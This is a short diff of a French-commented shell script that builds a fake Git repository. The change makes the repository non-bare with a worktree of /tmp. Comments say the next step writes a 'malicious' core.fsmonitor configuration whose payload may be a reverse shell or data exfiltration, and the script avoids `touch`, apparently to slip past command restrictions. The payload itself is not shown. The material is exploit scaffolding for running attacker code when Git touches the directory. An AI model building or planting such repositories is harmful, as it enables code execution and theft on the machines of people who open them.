@@ -35,7 +35,7 @@ mkdir -p "$TARGET_DIR/objects/info" "$TARGET_DIR/objects/pack" "$TARGET_DIR/refs
 # Créer les fichiers de base d'un dépôt Git
 # Utilisation de `printf` ou `echo` avec des redirections pour éviter `touch`
 /usr/bin/printf 'ref: refs/heads/master\n' > "$TARGET_DIR/HEAD"
-/usr/bin/printf '[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = true\n' > "$TARGET_DIR/config"
+/usr/bin/printf '[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tworktree = /tmp\n\tbare = false\n' > "$TARGET_DIR/config"
 
 # Créer un fichier de configuration malveillant pour core.fsmonitor
 # Le payload peut être un reverse shell, une exfiltration de données, etc.
